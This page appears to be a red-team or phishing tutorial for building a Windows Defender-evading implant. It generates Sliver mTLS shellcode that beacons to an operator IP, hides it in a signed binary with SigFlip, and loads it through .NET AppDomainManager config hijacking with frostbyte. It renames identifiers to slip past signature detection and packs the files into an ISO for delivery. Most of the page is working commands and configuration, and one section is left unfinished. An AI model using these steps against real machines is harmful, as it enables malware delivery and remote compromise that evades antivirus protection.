+++
title = "Better Payload Generation"
weight = 100
+++

### Better implants (frostbyte bypass windows defender)

Instead of generating a executable. We can generate shellcode. We can then use something like [https://github.com/pwn1sher/frostbyte](https://github.com/pwn1sher/frostbyte) to load that shellcode into memory and execute it.

Lets get download the [frostbyte zip](https://github.com/pwn1sher/frostbyte/archive/refs/heads/main.zip) from Github. Extract it to the desktop.

We need a .net binary with a .exe.config file. Windows has lots of those in `C:\Windows\Microsoft.NET\Framework64\v4.0.30319`.

![Windows Executable with Config](/static/how-to-phishing/windows-executable-with-config.png)

### Generate shellcode

In a sliver shell we need to run the following be sure to replace the ip with your vm's ip.

```bash
generate --mtls replaceip -f shellcode --save implants/shellcodex64.bin
```

Copy the shellcode to your windows machine.


```bash
SigFlip.exe -i "C:\Users\testuser\Desktop\frostbyte-main\jsc.exe" "C:\Users\testuser\Desktop\frostbyte-main\shellcodex64.bin" "C:\Users\testuser\Desktop\frostbyte-main\AuthHelper.exe" "iamadumbsecret"
```

- We need to replace `test` with our executabe name our executable name without the extenaion (`AuthHelper`). 
- Next we need to update the value of `appDomainManagerType` to be something else `NewAuthHelper`.
- Finally lets make `privatePath` a relative path `.`
- save as `AuthHelper.exe.config`

```xml
<configuration>
   <runtime>
      <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
         <probing privatePath="."/>
      </assemblyBinding> 
	  <appDomainManagerAssembly value="AuthHelper, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />  
	  <appDomainManagerType value="NewAuthHelper" />  
   </runtime>
</configuration>
```

Now we need to update the `test.cs` file.

- remove top three lines prepended with `#`
- replace `Z45UDG` with `NewAuthHelper`
- comment out logging
- replace `S3cretK3y` with `iamadumbsecret`
- change `Z:\\zloader\\update.exe` to `AuthHelper.exe`
- replace all instances of `shellcode` with `pizza`
- replace `ClassExample` with `WeatherChecker`
- replace `Beacon` with `Forecast`
- replace `Decrypt` with `Process`

We'll also want to change some of the code to be a little different


```
C:\windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library /out:AuthHelper.dll test.cs
```





test ....



### PackMyPayload

https://github.com/mgeeky/PackMyPayload

Create a new folder and andd your files (.dll, .exe, .exe.config)

```
./PackMyPayload.py --hide test.dll,test.exe.config foldername isoname.iso -v
```

now we should be able to mount the iso and run our exe to get an implant session.